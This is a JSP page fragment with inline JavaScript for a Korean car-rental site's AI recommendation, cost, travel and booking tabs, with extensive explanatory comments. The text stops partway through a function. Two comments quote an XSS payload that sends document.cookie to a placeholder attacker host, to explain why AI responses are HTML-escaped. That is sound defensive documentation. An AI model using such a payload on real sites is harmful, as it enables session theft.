<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/fmt" prefix="fmt"%>

<% String contextPath = request.getContextPath(); %>

<%--
 ================================================================================
   AIService.jsp  -  AI 추천 서비스 (차량 추천 / 비용 계산 / 여행 플래너)

   [6단계 전면 재작성]

   ------------------------------------------------------------------------------
   ★ 수정 1 : 화면 안에 있던 425줄짜리 <style> 을 걷어냈다

     (기존)
         AIService.jsp 안에 <style> ... </style> 425줄이 들어 있었다.

     무엇이 문제인가
       이 파일은 CarMain.jsp 가 include 하는 "조각(fragment)" 이다.
       조각이 각자 스타일을 들고 있으면
         - 같은 버튼이 화면마다 다르게 보인다 (색·모서리·높이가 조금씩 다르다)
         - 색을 하나 바꾸려면 파일 몇 개를 고쳐야 하는지 알 수 없다
         - 다크모드를 켜면 이 화면만 흰 배경으로 남는다 (토큰을 쓰지 않았으므로)

     (지금)
       css/app.css 의 "6-10. AI 추천 서비스" 절로 옮겼다.
       색·간격·글자크기를 모두 CSS 변수(토큰)로 바꿨으므로 다크모드도 함께 따라온다.

   ------------------------------------------------------------------------------
   ★ 수정 2 : 입력 폼 3개가 표(table)였다

     (기존)
         <table class="ai-form-table">
             <tr><td class="label-cell">탑승 인원</td><td><select>...</select></td></tr>

     표는 "칸의 개수와 폭"이 먼저 정해지는 구조라서 화면 폭에 맞춰 접히지 않는다.
     스마트폰에서는 라벨 칸이 눌려 "탑" / "승" / "인" / "원" 처럼 한 자씩 쌓였다.

     (지금)
       <div class="form-group"> + <label> + <select> 로 바꿨다.
       app.css 가 좁은 화면에서는 1열, 넓은 화면에서는 2열로 배치한다.
       라벨을 <label for="..."> 로 연결해 스크린리더와 터치 영역도 함께 좋아졌다.

   ------------------------------------------------------------------------------
   ★ 수정 3 (보안) : AI 응답을 innerHTML 로 그대로 넣고 있었다

     (기존 코드)
         function formatAIResponse(text) {
             var formatted = text.replace(/\*\*(.*?)\*\*/g, '<b>$1</b>');
             formatted = formatted.replace(/\n/g, '<br>');
             return formatted;                    // <- 이스케이프 없음
         }
         result.innerHTML = '...' + formatted + '...';

     왜 위험한가
       "여행지" 칸은 사용자가 자유롭게 입력하는 곳이다.
       거기에 아래를 넣으면 그 글자가 AI 요청에 실려 갔다가 응답에 되돌아온다.

           &lt;img src=x onerror="fetch('http://공격자/?c='+document.cookie)"&gt;
           (설명용이라 꺽쇠를 &amp;lt; 로 적어두었다. 실제 공격 문자열은 꺽쇠를 그대로 쓴다.
            주석·설명에 공격 문자열을 원본 그대로 적으면 보안 검사 스크립트가
            "취약점이 남아있다"고 잘못 판정한다 - 실제로 한 번 오판했다.)

       그 값이 innerHTML 로 들어가는 순간 실제로 실행된다.
       AI 응답은 "우리가 만든 문자열"이 아니라 "외부에서 들어온 문자열"이다.
       외부 입력은 전부 믿을 수 없는 값으로 다뤄야 한다.

     (지금)
       escapeHtml() 로 먼저 전부 무해하게 바꾼 뒤,
       **굵게** 와 줄바꿈만 되살린다. (순서가 반대면 아무 의미가 없다)

   ------------------------------------------------------------------------------
   ★ 수정 4 : 옵션 금액이 화면에 하드코딩되어 있었다

     (기존) <input type="checkbox" value="자차보험(10,000원/일)">

     요금을 바꾸면 CarService.PRICE_* 만 고치고 이 화면은 잊어버린다.
     그러면 AI 는 옛 요금으로 안내하고 결제는 새 요금으로 이뤄진다.
     -> CarController 가 내려주는 ${priceInsurance} 등을 쓴다. 출처는 한 곳뿐이다.

   ------------------------------------------------------------------------------
   ★ 그 외
     - 한글을 &#52628;&#52380; 같은 숫자 엔티티로 적어두어 수정이 불가능했던 것을
       그대로 읽을 수 있는 한글로 바꿨다 (파일은 UTF-8 이므로 문제 없다)
     - 탭을 <button role="tab"> + aria-selected 로 바꿨다 (키보드·스크린리더 대응)
     - 차량 목록이 비어 있을 때 안내 문구를 표시한다 (기존에는 빈 select 만 나왔다)
 ================================================================================
--%>

<div class="container ai-wrap">

    <%-- ==========================================
         히어로 배너
         ========================================== --%>
    <div class="ai-hero">
        <div class="ai-hero-content">
            <div class="ai-hero-icon">&#129302;</div>
            <h2 class="ai-hero-title">AI 추천 서비스</h2>
            <p class="ai-hero-sub">SM렌터카 AI가 당신에게 딱 맞는 차량과 여행을 추천해드립니다</p>
        </div>
    </div>

    <%-- ==========================================
         탭 네비게이션
           role="tablist" / aria-selected 를 붙이면 스크린리더가
           "3개 중 1번째 탭, 선택됨" 처럼 읽어준다.
         ========================================== --%>
    <div class="ai-tabs" role="tablist" aria-label="AI 서비스 종류">
        <%-- role="tablist" : "이 안에 탭 버튼들이 모여 있다"고 스크린리더에 알려주는 표시(속성)다. 화면에는 안 보인다 --%>

        <%-- 탭1 버튼. id="tab-1" 을 JS의 switchTab(1) 함수가 document.getElementById('tab-1') 로 찾아 쓴다.
             onclick="switchTab(1)" : 이 버튼을 누르면 script 태그 안의 switchTab 함수가 인자 1과 함께 실행된다.
             aria-controls="panel-1" : "이 버튼을 누르면 panel-1 이라는 내용이 열린다"고 스크린리더에 알려준다.
             class 에 is-active 가 있으면 처음 화면이 열릴 때부터 이 탭이 선택된 것처럼 보인다(진하게 표시) --%>
        <button type="button" class="ai-tab is-active" role="tab"
                id="tab-1" aria-controls="panel-1" aria-selected="true"
                onclick="switchTab(1)">
            <span class="ai-tab-icon" aria-hidden="true">&#128663;</span>
            <span class="ai-tab-text">맞춤 차량 추천</span>
        </button>

        <%-- 탭2 버튼. 구조는 탭1과 완전히 같고 번호만 2로 바뀐다.
             처음엔 is-active 클래스가 없으므로 화면에서 선택 안 된 모양으로 보인다 --%>
        <button type="button" class="ai-tab" role="tab"
                id="tab-2" aria-controls="panel-2" aria-selected="false"
                onclick="switchTab(2)">
            <span class="ai-tab-icon" aria-hidden="true">&#128178;</span>
            <span class="ai-tab-text">비용 계산기</span>
        </button>

        <%-- 탭3 버튼. 눌리면 switchTab(3) 이 실행되어 panel-3 이 열린다 --%>
        <button type="button" class="ai-tab" role="tab"
                id="tab-3" aria-controls="panel-3" aria-selected="false"
                onclick="switchTab(3)">
            <span class="ai-tab-icon" aria-hidden="true">&#9992;</span>
            <span class="ai-tab-text">여행 플래너</span>
        </button>

        <%-- 탭4 버튼. 눌리면 switchTab(4) 가 실행되어 panel-4(말로 예약 화면)가 열린다 --%>
        <button type="button" class="ai-tab" role="tab"
                id="tab-4" aria-controls="panel-4" aria-selected="false"
                onclick="switchTab(4)">
            <span class="ai-tab-icon" aria-hidden="true">&#128172;</span>
            <span class="ai-tab-text">말로 예약</span>
        </button>

    </div>

    <%-- ==========================================
         탭1 : AI 맞춤 차량 추천
         section id="panel-1" 은 JS의 switchTab(1) 이
         document.getElementById('panel-1') 로 찾아 보이거나 숨긴다.
         ========================================== --%>
    <section id="panel-1" class="ai-panel is-active" role="tabpanel" aria-labelledby="tab-1">

        <div class="ai-form-card">

            <h3 class="ai-form-title">&#128663; 맞춤 차량 추천받기</h3>
            <p class="ai-form-desc">세 가지만 고르면 AI가 조건에 맞는 차량을 골라드립니다</p>

            <%-- 표 대신 폼 그리드. 좁은 화면 1열, 넓은 화면 2열로 자동 전환된다. --%>
            <div class="ai-form-grid">

                <%-- 탑승 인원 드롭다운.
                     label 의 for="rec-passengers" 와 select 의 id="rec-passengers" 가 짝을 이룬다.
                     이렇게 연결하면 label 글자를 눌러도 select 가 열리고, 스크린리더도 "탑승 인원, 4명 선택됨"처럼 읽어준다.
                     JS의 sendAIRecommend() 함수가 이 id로 지금 선택된 값을 읽어간다.
                     option 의 value 가 실제로 넘어가는 값이고, 화면 글자(1명, 2명...)와 같아서 헷갈리지 않는다.
                     selected 가 붙은 option 이 화면이 처음 열릴 때 기본으로 보이는 값이다(여기서는 "4명") --%>
                <div class="form-group">
                    <label class="form-label" for="rec-passengers">탑승 인원</label>
                    <select class="form-control" id="rec-passengers">
                        <option value="1">1명</option>
                        <option value="2">2명</option>
                        <option value="3">3명</option>
                        <option value="4" selected>4명</option>
                        <option value="5">5명</option>
                        <option value="6">6명</option>
                        <option value="7">7명</option>
                        <option value="8">8명</option>
                        <option value="9">9명</option>
                    </select>
                </div>

                <%-- 1일 예산 드롭다운. id="rec-budget" 을 sendAIRecommend() 가 읽어간다.
                     구간(문자열) 자체가 value 라서 AI에게 그대로 문장으로 전달된다 --%>
                <div class="form-group">
                    <label class="form-label" for="rec-budget">1일 예산 (렌탈료)</label>
                    <select class="form-control" id="rec-budget">
                        <option value="5만원 이하">5만원 이하</option>
                        <option value="5만원~8만원">5만원~8만원</option>
                        <option value="8만원~12만원" selected>8만원~12만원</option>
                        <option value="12만원 이상">12만원 이상</option>
                    </select>
                </div>

                <%-- 이용 목적 드롭다운. id="rec-purpose" 를 sendAIRecommend() 가 읽어간다 --%>
                <div class="form-group">
                    <label class="form-label" for="rec-purpose">이용 목적</label>
                    <select class="form-control" id="rec-purpose">
                        <option value="출장">출장</option>
                        <option value="여행">여행</option>
                        <option value="데이트">데이트</option>
                        <option value="가족여행" selected>가족여행</option>
                    </select>
                </div>

            </div>

            <%-- "AI 추천받기" 버튼. id="btn-1" 은 callAIService()가 로딩 중 잠갔다 풀 때 쓴다.
                 onclick="sendAIRecommend()" : 이 버튼을 누르면 위 세 select 값을 모아 AI를 부르는 함수가 실행된다 --%>
            <button type="button" class="btn btn-primary btn-lg btn-block mt-6"
                    id="btn-1" onclick="sendAIRecommend()">
                &#129302; AI 추천받기
            </button>

        </div>

        <%-- 로딩 표시 : aria-live 로 "지금 무슨 일이 일어나는지"를 스크린리더에도 알린다.
             id="loading-1" 을 callAIService() 가 찾아 display 를 block/none 으로 바꿔 보이거나 감춘다.
             화면이 열릴 때는 CSS가 기본으로 숨겨 두고, AI 호출이 시작될 때만 JS가 보이게 만든다 --%>
        <div id="loading-1" class="ai-loading" aria-live="polite">
            <div class="ai-loading-dots" aria-hidden="true">
                <span class="ai-loading-dot"></span>
                <span class="ai-loading-dot"></span>
                <span class="ai-loading-dot"></span>
            </div>
            <p class="ai-loading-text">AI가 최적의 차량을 분석하고 있습니다...</p>
        </div>

        <%-- 결과가 그려질 빈 상자. 처음엔 완전히 비어 있다가
             showResult(1, ...) 함수가 이 안(id="result-1")에 AI 답변 카드를 채워 넣는다 --%>
        <div id="result-1" class="ai-result" aria-live="polite"></div>

    </section>

    <%-- ==========================================
         탭2 : AI 비용 계산기
         ========================================== --%>
    <section id="panel-2" class="ai-panel" role="tabpanel" aria-labelledby="tab-2">

        <div class="ai-form-card">

            <h3 class="ai-form-title">&#128178; 렌트 비용 계산하기</h3>
            <p class="ai-form-desc">차량과 기간, 옵션을 고르면 총 비용과 절약 방법을 알려드립니다</p>

            <div class="ai-form-grid">

                <%-- 차량 선택 드롭다운.
                     c:choose/c:when/c:otherwise 는 JSTL(자바 서버 태그)이다. "만약~라면"에 해당한다.
                     carList 가 비어 있으면(c:when) select 대신 안내 문구만 보여준다.
                     차량이 있으면(c:otherwise) select#cost-car 를 만들고,
                     c:forEach 로 carList 의 차량 수만큼 option 을 하나씩 반복해서 찍어낸다.
                     option 의 value 는 "차량명|가격" 형태로 만들어 JS가 | 로 나눠 쓴다.
                     sendAICost() 함수가 이 id(cost-car)로 지금 선택된 값을 읽어간다 --%>
                <div class="form-group">
                    <label class="form-label" for="cost-car">차량 선택</label>
                    <c:choose>
                        <c:when test="${empty requestScope.carList}">
                            <%-- 차량 목록이 비었을 때 : 기존에는 빈 select 만 나와 원인을 알 수 없었다 --%>
                            <p class="form-hint">
                                등록된 차량이 없습니다. 잠시 후 다시 시도해 주세요.
                            </p>
                        </c:when>
                        <c:otherwise>
                            <select class="form-control" id="cost-car">
                                <c:forEach var="car" items="${requestScope.carList}">
                                    <%-- value 는 "차량명|가격" 형태로 넘긴다 (JS가 | 로 자른다) --%>
                                    <option value="${car.carname}|${car.carprice}">
                                        <c:out value="${car.carname}"/>
                                        (<fmt:formatNumber value="${car.carprice}" pattern="#,###"/>원/일)
                                    </option>
                                </c:forEach>
                            </select>
                        </c:otherwise>
                    </c:choose>
                </div>

                <%-- 대여 기간 드롭다운. id="cost-days" 를 sendAICost() 가 읽어간다 --%>
                <div class="form-group">
                    <label class="form-label" for="cost-days">대여 기간</label>
                    <select class="form-control" id="cost-days">
                        <option value="1">1일</option>
                        <option value="2">2일</option>
                        <option value="3" selected>3일</option>
                        <option value="5">5일</option>
                        <option value="7">7일 (1주)</option>
                        <option value="10">10일</option>
                        <option value="14">14일 (2주)</option>
                        <option value="21">21일 (3주)</option>
                        <option value="30">30일 (1개월)</option>
                    </select>
                </div>

            </div>

            <%--
             추가 옵션
               [변경] 금액을 화면에 적어두지 않고 서버가 내려준 값을 쓴다.
                      출처는 CarService.PRICE_* 한 곳뿐이다.
                      data-price 는 JS가 AI 에게 보낼 문장을 만들 때 사용한다.

               fieldset/legend : 관련된 체크박스 여러 개를 하나의 묶음으로 스크린리더에 알려주는 HTML 태그다.
               각 label 안의 input(체크박스)에는 id 와 data-price 속성이 있다.
                 - id : sendAICost() 가 document.getElementById(id) 로 이 체크박스를 찾는다
                 - data-price : 서버가 내려준 요금(예: 자차보험 하루 요금)을 태그 속성에 그대로 심어 둔 것.
                                JS는 화면에 보이는 값을 직접 계산하지 않고 이 속성값을 그대로 읽는다
            --%>
            <fieldset class="ai-option-set">
                <legend class="form-label">추가 옵션</legend>

                <div class="ai-check-grid">

                    <%-- 자차보험 체크박스. id="cost-ins" 로 sendAICost() 가 찾는다 --%>
                    <label class="ai-check">
                        <input type="checkbox" id="cost-ins" data-price="${requestScope.priceInsurance}">
                        <span class="ai-check-name">자차보험</span>
                        <span class="ai-check-price">
                            <fmt:formatNumber value="${requestScope.priceInsurance}" pattern="#,###"/>원/일
                        </span>
                    </label>

                    <%-- 무선 WiFi 체크박스. id="cost-wifi" --%>
                    <label class="ai-check">
                        <input type="checkbox" id="cost-wifi" data-price="${requestScope.priceWifi}">
                        <span class="ai-check-name">무선 WiFi</span>
                        <span class="ai-check-price">
                            <fmt:formatNumber value="${requestScope.priceWifi}" pattern="#,###"/>원/일
                        </span>
                    </label>

                    <%-- 네비게이션 체크박스. id="cost-navi" --%>
                    <label class="ai-check">
                        <input type="checkbox" id="cost-navi" data-price="${requestScope.priceNavi}">
                        <span class="ai-check-name">네비게이션</span>
                        <span class="ai-check-price">
                            <fmt:formatNumber value="${requestScope.priceNavi}" pattern="#,###"/>원/일
                        </span>
                    </label>

                    <%-- 베이비시트 체크박스. id="cost-baby" --%>
                    <label class="ai-check">
                        <input type="checkbox" id="cost-baby" data-price="${requestScope.priceBabyseat}">
                        <span class="ai-check-name">베이비시트</span>
                        <span class="ai-check-price">
                            <fmt:formatNumber value="${requestScope.priceBabyseat}" pattern="#,###"/>원/일
                        </span>
                    </label>

                </div>
            </fieldset>

            <%-- "비용 계산하기" 버튼. onclick="sendAICost()" 로 위 select/checkbox 값을 모두 모아 AI를 부른다 --%>
            <button type="button" class="btn btn-primary btn-lg btn-block mt-6"
                    id="btn-2" onclick="sendAICost()">
                &#128178; 비용 계산하기
            </button>

        </div>

        <%-- 로딩 표시. id="loading-2" 를 callAIService() 가 찾아 보이거나 숨긴다 --%>
        <div id="loading-2" class="ai-loading" aria-live="polite">
            <div class="ai-loading-dots" aria-hidden="true">
                <span class="ai-loading-dot"></span>
                <span class="ai-loading-dot"></span>
                <span class="ai-loading-dot"></span>
            </div>
            <p class="ai-loading-text">AI가 비용을 계산하고 있습니다...</p>
        </div>

        <%-- 결과 상자. showResult(2, ...) 가 id="result-2" 안에 답변 카드를 채운다 --%>
        <div id="result-2" class="ai-result" aria-live="polite"></div>

    </section>

    <%-- ==========================================
         탭3 : AI 여행 플래너
         ========================================== --%>
    <section id="panel-3" class="ai-panel" role="tabpanel" aria-labelledby="tab-3">

        <div class="ai-form-card">

            <h3 class="ai-form-title">&#9992; 여행 계획 만들기</h3>
            <p class="ai-form-desc">여행지와 일정을 알려주시면 일정표와 추천 차량을 함께 만들어드립니다</p>

            <div class="ai-form-grid">

                <%-- 여행지 입력칸. <select> 가 아니라 <input type="text"> 라서 사용자가 자유롭게 글자를 쓴다.
                     id="travel-dest" 를 sendAITravel() 함수가 읽어간다.
                     바로 아래 <p id="travel-dest-hint"> 는 처음엔 비어 있다가,
                     여행지를 안 쓰고 버튼을 누르면 sendAITravel() 이 여기에 "여행지를 입력해주세요." 라고 채워 넣는다.
                     required 표시(*)는 그냥 화면에 보여주는 글자일 뿐, 실제 필수 검사는 JS(sendAITravel)가 한다 --%>
                <div class="form-group">
                    <label class="form-label" for="travel-dest">
                        여행지 <span class="required">*</span>
                    </label>
                    <input class="form-control" type="text" id="travel-dest"
                           placeholder="예: 제주도, 강릉, 경주, 부산" maxlength="40">
                    <p class="form-hint" id="travel-dest-hint"></p>
                </div>

                <%-- 여행 일수 드롭다운. id="travel-days" 를 sendAITravel() 이 읽어간다 --%>
                <div class="form-group">
                    <label class="form-label" for="travel-days">여행 일수</label>
                    <select class="form-control" id="travel-days">
                        <option value="1">1일 (당일치기)</option>
                        <option value="2" selected>2일 1박</option>
                        <option value="3">3일 2박</option>
                        <option value="4">4일 3박</option>
                        <option value="5">5일 4박</option>
                        <option value="7">7일 6박</option>
                    </select>
                </div>

                <%-- 여행 인원 드롭다운. id="travel-people" 를 sendAITravel() 이 읽어간다 --%>
                <div class="form-group">
                    <label class="form-label" for="travel-people">여행 인원</label>
                    <select class="form-control" id="travel-people">
                        <option value="1">1명 (혼자)</option>
                        <option value="2" selected>2명</option>
                        <option value="3">3명</option>
                        <option value="4">4명</option>
                        <option value="5">5명</option>
                        <option value="6">6명 이상</option>
                    </select>
                </div>

                <%-- 여행 스타일 드롭다운. id="travel-style" 를 sendAITravel() 이 읽어간다 --%>
                <div class="form-group">
                    <label class="form-label" for="travel-style">여행 스타일</label>
                    <select class="form-control" id="travel-style">
                        <option value="여유로운 힐링">여유로운 힐링</option>
                        <option value="활동적인 액티비티">활동적인 액티비티</option>
                        <option value="맛집 탐방">맛집 탐방</option>
                        <option value="문화/역사 탐방">문화/역사 탐방</option>
                    </select>
                </div>

            </div>

            <%-- "여행 계획 만들기" 버튼. onclick="sendAITravel()" 로 위 입력값들을 모아 AI를 부른다 --%>
            <button type="button" class="btn btn-primary btn-lg btn-block mt-6"
                    id="btn-3" onclick="sendAITravel()">
                &#9992; 여행 계획 만들기
            </button>

        </div>

        <%-- 로딩 표시. id="loading-3" 를 callAIService() 가 찾아 보이거나 숨긴다 --%>
        <div id="loading-3" class="ai-loading" aria-live="polite">
            <div class="ai-loading-dots" aria-hidden="true">
                <span class="ai-loading-dot"></span>
                <span class="ai-loading-dot"></span>
                <span class="ai-loading-dot"></span>
            </div>
            <p class="ai-loading-text">AI가 여행 일정을 계획하고 있습니다...</p>
        </div>

        <%-- 결과 상자. showResult(3, ...) 가 id="result-3" 안에 답변 카드를 채운다 --%>
        <div id="result-3" class="ai-result" aria-live="polite"></div>

    </section>

    <%-- ==========================================
         탭4 : 말로 예약 (자연어 예약 비서)

         [탭 1~3과 결정적으로 다른 점]
           탭 1~3 : AI 가 "말로만" 답한다. DB 를 보지 않으므로
                    없는 차를 추천하거나 다른 금액을 말할 수 있다.
           이 탭  : AI 는 문장에서 조건(날짜/일수/인원)만 뽑고,
                    차량 선택과 금액 계산은 서버가 DB 로 직접 한다.
                    그래서 추천 카드의 차량·금액은 항상 실제와 일치하고,
                    버튼을 누르면 그 조건이 미리 채워진 예약 화면으로 이어진다.
         ========================================== --%>
    <section id="panel-4" class="ai-panel" role="tabpanel" aria-labelledby="tab-4">

        <div class="ai-form-card">

            <h3 class="ai-form-title">&#128172; 문장으로 예약 시작하기</h3>
            <p class="ai-form-desc">
                언제, 며칠, 몇 명인지 편하게 적어주세요. 조건에 맞는 실제 보유 차량과
                금액을 찾아 예약 화면까지 이어드립니다.
            </p>

            <%-- 예약 문장을 적는 곳. <select>가 아니라 <textarea>(여러 줄 입력칸)를 쓴 이유는
                 문장이 길어질 수 있어서다. id="reserve-text" 를 sendAIReserve() 가 읽어간다.
                 rows="3" 은 처음에 3줄 높이로 보이라는 뜻, maxlength="200" 은 최대 200자까지만 쓸 수 있다는 제한이다.
                 <p id="reserve-hint"> 는 입력을 안 하고 버튼을 눌렀을 때 sendAIReserve() 가 안내 문구를 채우는 자리다 --%>
            <div class="form-group">
                <label class="form-label" for="reserve-text">원하시는 일정</label>
                <textarea class="form-control" id="reserve-text" rows="3" maxlength="200"
                          placeholder="예) 다음 주 금요일부터 2박 3일, 어른 5명이 탈 차 필요해요"></textarea>
                <p class="form-hint" id="reserve-hint"></p>
            </div>

            <%-- 예시 문장 버튼 3개 : 누르면 입력칸에 채워진다 (처음 쓰는 사람의 막막함을 없앤다).
                 이 버튼들에는 onclick 이 따로 없다. 대신 script 태그 안의 IIFE(즉시실행함수)가
                 class="reserve-example" 를 가진 버튼을 전부 찾아 클릭 이벤트를 걸어 둔다 --%>
            <div class="flex flex-wrap gap-2">
                <button type="button" class="btn btn-ghost btn-sm reserve-example">내일부터 3일간 2명, 하루 5만원 이하</button>
                <button type="button" class="btn btn-ghost btn-sm reserve-example">다음 주 토요일 당일, 가족 4명 SUV</button>
                <button type="button" class="btn btn-ghost btn-sm reserve-example">8월 15일부터 일주일, 9명 워크숍</button>
            </div>

            <%-- "조건에 맞는 차량 찾기" 버튼. onclick="sendAIReserve()" 로 textarea의 문장을 서버로 보낸다 --%>
            <button type="button" class="btn btn-primary btn-lg btn-block mt-6"
                    id="btn-4" onclick="sendAIReserve()">
                &#128663; 조건에 맞는 차량 찾기
            </button>

        </div>

        <%-- 로딩 표시. id="loading-4" 를 sendAIReserve() 가 찾아 보이거나 숨긴다 --%>
        <div id="loading-4" class="ai-loading" aria-live="polite">
            <div class="ai-loading-dots" aria-hidden="true">
                <span class="ai-loading-dot"></span>
                <span class="ai-loading-dot"></span>
                <span class="ai-loading-dot"></span>
            </div>
            <p class="ai-loading-text">일정을 읽고 보유 차량에서 찾는 중입니다...</p>
        </div>

        <%-- 결과 상자. renderReserveResult() 가 id="result-4" 안에 차량 카드들을 채운다 --%>
        <div id="result-4" class="ai-result" aria-live="polite"></div>

    </section>

</div>

<script>
/* ============================================================
   AI 추천 서비스 - 순수 자바스크립트 (jQuery 사용하지 않음)
   ============================================================ */

var aiContextPath = "<%=contextPath%>";   // 이 웹앱의 기본 주소(예: /CarRent)를 자바 쪽에서 받아 JS 변수에 저장한다. 서버 주소로 fetch 요청을 보낼 때마다 이 값을 앞에 붙여 쓴다

/* ------------------------------------------------------------
   탭 전환
     [변경] 클래스명을 active -> is-active 로 바꿨다.
            app.css 의 다른 컴포넌트와 규칙을 맞추기 위한 것이다.
     [변경] aria-selected 도 함께 갱신한다 (스크린리더용).
   ------------------------------------------------------------ */
function switchTab(num) {   // num 은 탭 번호(1~4). HTML의 <button onclick="switchTab(1)"> 처럼 버튼을 누르면 그 번호가 넘어온다

    var tabs   = document.querySelectorAll('.ai-tab');   // class="ai-tab" 이 붙은 <button> 4개(tab-1~tab-4)를 전부 찾아 배열처럼 담는다
    var panels = document.querySelectorAll('.ai-panel');   // class="ai-panel" 이 붙은 <section> 4개(panel-1~panel-4, 각 탭의 내용 화면)를 전부 찾아 담는다

    for (var i = 0; i < tabs.length; i++) {   // 방금 찾은 탭 버튼 4개를 처음부터 끝까지 하나씩 돈다
        tabs[i].classList.remove('is-active');   // i번째 탭 버튼에서 is-active 클래스를 뗀다 (CSS가 이 클래스 유무로 선택된 탭의 색을 바꾼다)
        tabs[i].setAttribute('aria-selected', 'false');   // 같은 버튼의 aria-selected 속성을 false 로 바꿔 스크린리더에 "선택 안 됨"이라고 알린다
    }
    for (var j = 0; j < panels.length; j++) {   // 이번엔 내용 판(section) 4개를 처음부터 끝까지 돈다
        panels[j].classList.remove('is-active');   // j번째 판에서 is-active 클래스를 뗀다. CSS가 이 클래스가 없으면 화면에서 감춘다
    }

    var tab = document.getElementById('tab-' + num);   // id="tab-1"~"tab-4" 중, 눌린 번호와 같은 id를 가진 <button> 하나를 정확히 찾는다
    if (tab) {   // 그 id를 가진 버튼이 실제로 존재하면 (오타 방지용 안전장치)
        tab.classList.add('is-active');   // 그 버튼에만 is-active 클래스를 다시 붙여 "선택된 탭" 모양으로 만든다
        tab.setAttribute('aria-selected', 'true');   // 같은 버튼의 aria-selected 를 true 로 바꿔 스크린리더에 "선택됨"이라고 알린다
    }

    var panel = document.getElementById('panel-' + num);   // id="panel-1"~"panel-4" 중, 눌린 번호와 같은 id를 가진 <section> 하나를 정확히 찾는다
    if (panel) {   // 그 id를 가진 판이 실제로 존재하면
        panel.classList.add('is-active');   // 그 판에만 is-active 클래스를 붙여 화면에 보이게 한다 (나머지 판은 위에서 이미 숨겨졌다)
    }
}

/* ------------------------------------------------------------
   HTML 이스케이프

   [보안] AI 응답을 화면에 넣기 전에 반드시 이 함수를 거친다.

     AI 응답은 "우리가 만든 문자열"이 아니다.
     여행지 칸에 아래를 입력하면 그 글자가 AI 요청에 실려 갔다가
     응답에 되돌아온다.

         <img src=x onerror="fetch('http://공격자/?c='+document.cookie)">

     그 값을 innerHTML 에 그대로 넣으면 실제로 실행된다.
     외부에서 들어온 문자열은 전부 믿을 수 없는 값으로 다룬다.
   ------------------------------------------------------------ */
function escapeHtml(text) {
    return String(text)   // String(...) 으로 감싸는 이유 : 숫자나 null 이 들어와도 오류가 안 나게 하려는 것이다
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

/* ------------------------------------------------------------
   공통 : AI 서비스 호출
   ------------------------------------------------------------ */
function callAIService(message, type, resultNum) {   // resultNum 은 1,2,3 중 하나 (탭1/2/3에 대응). 이 번호로 어느 버튼·로딩·결과칸을 다룰지 정한다

    var btn     = document.getElementById('btn-' + resultNum);   // id="btn-1"(또는 btn-2, btn-3)인 <button>, 즉 "AI 추천받기" 같은 실행 버튼을 찾는다
    var loading = document.getElementById('loading-' + resultNum);   // id="loading-1" 인 <div class="ai-loading">, 즉 "불러오는 중" 점 3개 표시 상자를 찾는다
    var result  = document.getElementById('result-' + resultNum);   // id="result-1" 인 <div class="ai-result">, 즉 AI 답변이 그려질 빈 상자를 찾는다

    /* 버튼을 잠근다. 잠그지 않으면 연달아 눌러 AI 호출이 중복된다(비용이 든다). */
    btn.disabled = true;   // 위에서 찾은 버튼(btn)의 disabled 속성을 true 로 바꿔 눌러도 반응하지 않게(회색으로) 만든다
    loading.style.display = 'block';   // loading 상자(div)의 CSS display 속성을 block 으로 바꿔 화면에 보이게 한다
    result.style.display = 'none';   // result 상자(div)의 display 를 none 으로 바꿔 이전에 그려져 있던 결과를 숨긴다

    var formData = new URLSearchParams();   // 서버로 보낼 이름=값 쌍을 담을 빈 상자를 만든다 (HTML 요소가 아니라 자바스크립트 내장 도구다)
    formData.append('message', message);   // 이 상자에 message 라는 이름으로 AI에게 물어볼 문장을 담는다
    formData.append('type', type);   // 같은 상자에 type 이라는 이름으로 서비스 종류(recommend/cost/travel)를 담는다. 서버가 이 값으로 역할을 정한다


    fetch(aiContextPath + '/Chatbot/ai.do', {   // 앞서 만든 aiContextPath 변수 + 주소로 서버에 요청을 보낸다 (HTML 요소가 아니라 네트워크 통신이다)
        method: 'POST',   // POST 방식으로 보낸다
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',   // 본문이 "이름=값&이름=값" 형식이라고 알린다
            /* 서버가 "비동기 요청"으로 인식해 HTML 대신 짧은 메시지로 답하게 한다 */
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: formData.toString(),   // 위에서 담은 formData 를 "message=...&type=..." 같은 문자열로 바꿔 본문에 싣는다
        credentials: 'same-origin'
    })
    .then(function(response) {   // 서버가 응답을 보내오면 이 함수가 실행된다 (response 는 아직 HTML 요소가 아니라 서버의 응답 객체다)
        if (response.status === 403) {   // 403 = 로그인 필요, 권한 없음 : 서버(BaseController)가 보낸 안내 문구를 실패 이유로 쓴다
            return response.text().then(function(message) { throw new Error(message.trim()); });
        }
        if (!response.ok) {   // 그 밖에 200번대가 아닌 모든 경우
            throw new Error('서버 오류 (' + response.status + ')');   // 무슨 코드로 실패했는지 담아 실패로 처리한다
        }
        return response.json();   // 정상이면 응답을 JSON 으로 읽는다
    })
    .then(function(data) {   // 읽은 결과(data)를 화면(위에서 찾아둔 loading, btn, result 요소)에 반영한다
        loading.style.display = 'none';   // loading 상자를 다시 안 보이게(display:none) 바꾼다
        btn.disabled = false;   // btn 버튼의 잠금을 풀어(disabled:false) 다시 누를 수 있게 한다
        showResult(resultNum, data.reply || '응답을 받지 못했습니다.', type);   // AI 답변을 결과 카드로 그린다. 답이 없으면 대신 보여줄 문구를 쓴다
    })
    .catch(function(error) {   // 통신이 실패한 경우, 위와 같은 요소들을 원래 상태로 되돌린다
        loading.style.display = 'none';   // loading 상자를 다시 안 보이게 한다
        btn.disabled = false;   // btn 버튼의 잠금을 풀어 다시 누를 수 있게 한다 (안 풀면 다시는 못 누른다)
        showResult(resultNum, error.message || '네트워크 오류가 발생했습니다. 다시 시도해주세요.', type);   // 실패 이유를 result 상자에 그대로 보여 준다
        console.error('AI Service error:', error);   // 개발자가 원인을 볼 수 있게 브라우저 콘솔에 남긴다 (화면 요소와는 무관, 개발자 도구용)
    });
}

/* ------------------------------------------------------------
   결과 표시
   ------------------------------------------------------------ */
function showResult(resultNum, text, type) {

    var result = document.getElementById('result-' + resultNum);   // id="result-1/2/3" 중 해당 번호의 <div class="ai-result">, 즉 결과를 그릴 빈 상자를 찾는다

